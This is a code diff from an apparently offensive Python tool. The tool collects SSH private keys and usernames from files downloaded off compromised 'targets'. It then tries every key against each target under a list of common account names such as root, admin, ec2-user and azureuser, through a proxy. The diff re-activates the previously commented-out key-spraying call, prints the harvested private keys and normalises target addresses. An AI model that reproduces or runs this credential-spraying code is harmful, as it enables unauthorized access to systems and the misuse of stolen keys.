@@ -119,12 +119,12 @@ def get_all_targets(proxy_host_port: str):
             downloaded_files = get_directories(os.path.join("downloads", target))
             # print(downloaded_files)
             ssh_files = get_ssh_files(downloaded_files)
-            # print(ssh_files)
+            print(ssh_files)
             if len(ssh_files) == 0:
                 continue
             # get a list of all the targets private keys
             list_of_private_keys = get_private_key(ssh_files)
-            # print(list_of_private_keys)
+            print(list_of_private_keys)
             # get a list of all the targets public keys, authorized_keys is treated as a public key in this sense
             # as it can often have a username at the end of the public key <pub key> root@hostname we want to 
             # include the file and check for this to add it to our username list 
@@ -132,16 +132,16 @@ def get_all_targets(proxy_host_port: str):
             # print(list_of_public_keys)
             # parse the public keys for valid usernames and get a list of valid usernames
             usernames = get_contents_from_pub_keys(list_of_public_keys)
-            print(usernames)
-            '''
             do_executor(target, usernames, list_of_private_keys, proxy_host_port)
-            '''
+            
 
 def do_executor(target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str):
     usernames = ["root", "admin", "test", "guest", "info", "adm",
                  "mysql", "user", "administrator", "oracle", "ftp",
                  "pi", "puppet", "ansible", "ec2-user", "vagrant",
                  "azureuser"]
+    if ":" in target:
+        target = target.split(":")[0]
     comb_usernames = list(usernames_from_pub_keys) + usernames
     for priv_key in priv_keys:
         for name in comb_usernames:
